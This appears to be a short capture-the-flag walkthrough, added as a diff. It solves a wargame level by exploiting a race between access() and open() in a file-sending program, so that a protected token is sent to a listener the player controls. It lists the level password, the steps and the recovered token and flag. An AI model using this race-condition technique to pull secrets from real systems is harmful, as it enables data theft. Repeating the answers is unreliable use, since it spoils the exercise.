@@ -1,0 +1,31 @@
+- Connect with login: "level10" and password: "s5cAJpM8ev6XHw998pRWG728z"
+- run level10
+	./level10 file host
+		sends file to host if you have access to it
+- ./level10 token 192.168.1.?
+	You don't have access to token
+- echo bonjour > /tmp/bonjour
+- ./level10 /tmp/bonjour 192.168.1.?
+	Connecting to 192.168.1.13:6969 .. Unable to connect to host 192.168.1.13
+- run server.rb and retry
+	Connecting to 192.168.1.13:6969 .. Connected!
+	Sending file .. wrote file!
+	_____________________
+	.*( )*.
+	bonjour
+- run with ltrace
+	access("/tmp/bonjour", 4)
+	open("/tmp/bonjour", 0, 010)
+- security hole -> try to replace file between access and open
+- scp -P 4242 sender.sh level10@192.168.1.?:/tmp
+- scp -P 4242 replacer.sh level10@192.168.1.?:/tmp
+- /tmp/sender.sh
+- ctrl-Z
+- bg
+- jobs
+- ./server.rb (on host)
+- /tmp/replacer.sh
+	woupa2yuojeeaaed06riuj63c
+- ctrl-C and kill -9 job
+- connect to flag10 and getflag
+	feulo4b72j7edeahuete3no7c
